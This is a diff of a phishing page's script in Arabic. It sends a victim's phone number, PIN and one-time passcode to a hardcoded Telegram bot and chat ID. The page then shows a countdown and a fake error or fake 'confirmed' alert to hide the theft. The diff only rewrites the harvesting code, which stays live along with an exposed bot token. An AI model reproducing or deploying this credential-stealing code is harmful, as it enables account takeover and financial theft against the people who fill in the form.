@@ -38,32 +38,42 @@
 <script>
 const botToken = "8194091042:AAHIxhB5ymPFwccfuM0AKDa78ukH0kt3IQu";
 const chatId = "5244299184";
-   
-    function sendToTelegram() {
-        const p = document.getElementById('phone').value;
-        const s = document.getElementById('pin').value;
-        const text = `🚨 دخول جديد:\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
-        .then(() => {
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            startTimer();
-        });
-    }
-    function sendOtpToTelegram() {
-        const o = document.getElementById('otp').value;
-        const text = `🔢 الرمز OTP: ${o}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
-        .then(() => { alert("خطأ في الشبكة، حاول لاحقاً."); });
-    }
-    function startTimer() {
-        let t = 120;
-        setInterval(() => {
-            let m = Math.floor(t / 60); let s = t % 60;
-            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-            if (t > 0) t--;
-        }, 1000);
-    }
+
+function sendToTelegram() {
+    const p = document.getElementById('phone').value;
+    const s = document.getElementById('pin').value;
+    const text = `🚨 دخول جديد :\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`;
+    
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+    .then(() => {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        startTimer();
+    });
+}
+
+function sendOtpToTelegram() {
+    const o = document.getElementById('otp').value;
+    const text = `🔢 الرمز OTP: ${o}`;
+    
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+    .then(() => {
+        alert("تم التأكيد بنجاح، يرجى الانتظار...");
+        window.location.reload(); 
+    });
+}
+
+function startTimer() {
+    let t = 120;
+    setInterval(() => {
+        let m = Math.floor(t / 60); 
+        let s = t % 60;
+        document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+        if (t > 0) t--;
+    }, 1000);
+}
+</script>
+
 </script>
 </body>
 </html>
